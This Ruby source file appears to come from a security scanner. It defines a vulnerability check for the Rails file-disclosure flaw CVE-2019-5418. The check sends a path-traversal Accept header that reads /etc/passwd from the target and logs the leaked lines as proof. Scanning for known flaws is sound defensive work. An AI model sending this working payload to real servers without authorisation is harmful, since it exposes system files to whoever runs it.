module Intrigue
module Task
class RailsFileExposureCve20195418 < BaseTask

  def self.metadata
    {
      :name => "vuln/rails_file_exposure",
      :pretty_name => "Vuln Check - Rails File Exposure (CVE-2019-5418)",
      :authors => ["jcran", "jhawthorn"],
      :identifiers => [{ "cve" =>  "CVE-2019-5418" }],
      :description => "Rails < 6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, 4.2.11.1 is subject to" +
        " an information disclosure vulnerability which can be triggered by a specially crafted" +
        " accept header.",
      :references => [
        "https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q",
        "https://github.com/mpgn/CVE-2019-5418"
      ],
      :type => "vuln_check",
      :passive => false,
      :allowed_types => ["Uri"],
      :example_entities => [
        {"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}
      ],
      :allowed_options => [],
      :created_types => []
    }
  end

  # TODO... reporting feature

  ## Default method, subclasses must override this
  def run
    super

    require_enrichment

    ## Trigger: Accept Header of the following form
    ## ../../../../../../../../../../etc/passwd{{

    paths = [""] # Enter any known paths here (spidering first might be a good idea)
    headers = {"Accept" => "../../../../../../../../../../etc/passwd{{"}

    paths.each do |p|

      # Request
      uri = "#{_get_entity_name}/#{p}"
      response = http_request :get, "#{uri}", nil, headers
      etc_passwd_body = response.body_utf8.split("\n").first(3).join("\n") if response

      # Check for validity
      if response
        if "#{etc_passwd_body}" =~ /root\:x/
          _log "Vulnerable! Partial content of response: #{etc_passwd_body}"
          _create_linked_issue("rails_information_disclosure_cve_2019_5418", {
            proof: {
              response_data: etc_passwd_body
            }
          })
        else
          _log "Got non-vulnerable response: #{response.body_utf8}"
        end
      else
        _log "Empty response at #{uri}"
      end
    end

  end

end
end
end
